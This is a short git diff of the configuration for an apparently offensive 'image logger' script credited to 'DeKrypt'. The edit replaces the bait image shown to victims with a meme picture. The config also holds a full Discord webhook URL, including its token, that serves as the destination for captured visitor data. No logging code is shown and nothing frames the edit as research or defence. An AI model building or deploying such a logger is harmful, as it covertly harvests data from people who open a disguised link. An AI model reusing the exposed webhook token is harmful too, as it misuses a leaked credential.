@@ -15,7 +15,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1469122256998236193/yteHu-hkxgl09PkHVXNj061orFvvd33Eturb-KlV35TbahZrurSzmWEJDlm5ohdS21N9",
-    "image": "https://static.tvtropes.org/pmwiki/pub/images/punkd.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://tricolortimes.com/wp-content/uploads/2025/04/Cynthia-M-TikTok-Brainrot-731x1200.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
